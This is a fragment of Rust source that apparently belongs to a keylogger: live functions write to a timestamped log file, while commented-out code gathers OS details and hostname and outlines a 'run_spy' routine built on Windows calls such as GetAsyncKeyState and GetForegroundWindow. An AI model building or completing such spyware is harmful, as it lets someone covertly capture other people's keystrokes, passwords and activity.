//
// fn log_header(file: &mut File) {
//     let os_info = {
//         let info = os_info::get();
//         format!(
//             "OS: type: {}\nVersion: {}\n",
//             info.os_type(),
//             info.version()
//         )
//     };
//
//     log(file, os_info);
//     let os_hostname = hostname::get().unwrap().into_string().unwrap();
//     println!("hostname: {:?}", os_hostname);
//     log(file, os_hostname);
// }
//
//fn run_spy(fd: &mut File) {

//GetUserDefaultLocaleName
//GetForegroundWindow
//GetwindowsthereadProcessId
//OpenProcess
//GetProcessImageFileNameW
//GetWindowTextLengthW
//GetWindowTextW
//GetAsyncKeyState
//}
fn log(file: &mut File, s: String) {
    #[cfg(debug_assertions)]
    {
        print!("{}", s);
    }

    match file.write(s.as_bytes()) {
        Err(e) => {
            println!("Couldn't write to log file: {}", e)
        }
        _ => {}
    }

    match file.flush() {
        Err(e) => {
            println!("Couldn't flush log file: {}", e)
        }
        _ => {}
    }
}

fn create_log_file() -> File {
    let now: DateTime<Utc> = Utc::now();
    let filename = format!(
        "log-{}-{:02}+{:02}+{:02}.log",
        now.date_naive(),
        now.hour(),
        now.minute(),
        now.second()
    );

    let logfile = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => f,

            Err(e) => {
                panic!("Could not create the log file {}", e)
            }
        }
    };
    logfile
}
